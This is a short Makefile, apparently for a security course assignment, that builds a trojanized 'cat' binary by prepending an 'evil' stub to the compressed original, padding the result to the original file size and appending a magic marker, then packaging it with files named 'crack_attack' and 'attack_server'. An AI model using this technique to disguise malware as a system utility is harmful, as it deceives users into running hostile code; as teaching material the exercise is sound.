all: gen_cat permission

permission:
	chmod +x crack_attack attack_server cat

gen_cat:
	cat cat.orig | xz > cat.xz
	cat cat.evil \
		| perl -pe "s/###/$$(cat cat.evil | wc -c | tr -d ' ')/" \
		| perl -pe "s/#####/$$(cat cat.xz | wc -c | tr -d ' ')/" \
		> cat
	cat cat.xz >> cat
	perl -e "print(\"\x00\" x $$(($$(cat cat.orig | wc -c) - $$(cat cat | wc -c) - 4)))" >> cat
	perl -e 'print("\xaf\xbe\xad\xde")' >> cat
	rm cat.xz

clean:
	-rm cat

pack:
	7z a 0816146.zip Makefile crack_attack attack_server
